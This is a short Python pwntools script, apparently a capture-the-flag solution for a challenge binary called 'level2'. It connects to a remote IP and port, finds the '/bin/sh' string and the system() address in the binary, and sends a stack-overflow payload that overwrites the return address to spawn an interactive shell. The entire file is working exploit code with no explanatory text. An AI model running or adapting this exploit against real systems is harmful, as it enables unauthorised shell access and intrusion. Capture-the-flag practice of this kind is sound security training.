from pwn import *

#io = process("level2")
io = remote("111.200.241.244", 60417)

elf = ELF("./level2")

binsh_addr = next(elf.search(b'/bin/sh'))
print(hex(binsh_addr))

pop_ebx_addr = 0x080482f5

pad = 0x88

io.recvline()

sys_addr = elf.sym["system"]
print(hex(sys_addr))

#payload = cyclic(0x88 + 4) + p32(pop_ebx_addr) + p32(binsh_addr) + p32(sys_addr)
payload = cyclic(0x88 + 4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)

io.sendline(payload)

io.interactive()

